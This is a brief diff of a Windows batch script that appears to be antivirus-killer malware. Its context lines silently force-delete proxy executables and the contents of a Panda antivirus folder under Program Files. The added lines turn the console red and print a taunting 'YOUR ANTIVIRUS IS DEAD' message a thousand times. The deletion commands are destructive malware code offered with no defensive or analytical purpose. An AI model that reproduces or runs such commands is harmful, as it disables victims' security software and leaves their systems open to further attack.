@@ -128,3 +128,6 @@ del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
 software\*.*
 rem
+color 04
+for /L %%n in (3,3,3000)do echo YOUR ANTIVIRUS IS DEAD HAHAHAHA!!!
+PAUSE
